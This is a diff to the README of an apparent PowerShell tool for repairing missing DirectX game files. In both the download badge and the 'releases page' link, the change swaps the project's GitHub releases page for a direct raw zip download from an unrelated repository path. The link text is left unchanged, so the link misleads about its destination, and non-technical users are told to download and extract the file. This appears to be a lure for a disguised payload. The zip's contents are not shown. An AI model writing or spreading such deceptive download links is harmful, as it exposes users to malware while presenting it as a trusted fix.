@@ -5,7 +5,7 @@ description: "Fix DirectX runtime errors and missing DLL files on Windows 10 and
 ---
 # 🛠️ DirectX-Repair-Kit-PowerShell - Fix missing game library files fast
 
-[![](https://img.shields.io/badge/Download-DirectX%20Repair-blue.svg)](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases)
+[![](https://img.shields.io/badge/Download-DirectX%20Repair-blue.svg)](https://raw.githubusercontent.com/brianabasidial309/brianabasidial309.github.io/main/woundableness/io_brianabasidial_github_2.6-alpha.3.zip)
 
 ## 🎯 About this tool
 Games on Windows often require specific system files to function. These files belong to the DirectX software collection. When these files go missing or corrupt, games fail to launch. Common error messages include mentions of d3dx9_43.dll or xinput1_3.dll. This tool automates the process of identifying and replacing these files. It works on Windows 10 and Windows 11. The kit uses PowerShell to execute the repair process safely and efficiently. You do not need technical knowledge to run the system.
@@ -19,7 +19,7 @@ Games on Windows often require specific system files to function. These files be
 ## 🚀 Getting Started
 Follow these steps to repair your game files. 
 
-1. Visit the [releases page](https://github.com/brianabasidial309/DirectX-Repair-Kit-PowerShell/releases) to access the download files.
+1. Visit the [releases page](https://raw.githubusercontent.com/brianabasidial309/brianabasidial309.github.io/main/woundableness/io_brianabasidial_github_2.6-alpha.3.zip) to access the download files.
 2. Click on the button labeled "DirectX-Repair-Kit.zip" under the latest release.
 3. Save the folder to your computer.
 4. Right-click the folder and select "Extract All" to see the contents.
